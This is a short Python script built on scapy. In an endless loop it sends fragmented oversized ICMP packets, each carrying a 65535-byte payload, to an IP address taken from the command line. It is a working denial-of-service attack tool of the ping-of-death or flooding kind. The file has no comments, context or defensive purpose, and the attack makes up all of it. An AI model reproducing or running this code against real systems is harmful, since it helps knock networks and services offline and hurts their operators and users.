#coding=utf8
from scapy.all import *
while 1:
    sendp(fragment(Ether()/IP(dst=sys.argv[1])/ICMP()/('p'*65535)))

